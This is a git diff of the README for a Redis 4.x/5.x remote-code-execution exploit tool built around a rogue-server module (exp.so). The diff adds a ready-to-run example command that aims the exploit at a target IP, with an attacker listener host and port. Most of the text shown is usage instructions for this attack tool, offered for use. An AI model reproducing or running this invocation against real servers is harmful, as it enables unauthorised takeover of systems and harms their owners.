@@ -5,12 +5,13 @@ A exploit for Redis 4.x/5.x RCE, inspired by [Redis post-exploitation](https://2
 This repo is a modified version of <https://github.com/n0b0dyCN/redis-rogue-server> .
 ## Usage:
 
-Compile exp.so from <https://github.com/RicterZ/RedisModules-ExecuteCommand>.
+Compile exp.so from <https://github.com/n0b0dyCN/redis-rogue-server>.
 
 
 ```
 usage: redis-rce.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-f FILE]
                     [-a AUTH] [-v]
+exp: python redis-rce.py -r 192.168.120.69 -L 192.168.45.231 -f ../redis-rogue-server/exp.so -p 6379 -P 6379
 
 Redis 4.x/5.x RCE with RedisModules
 
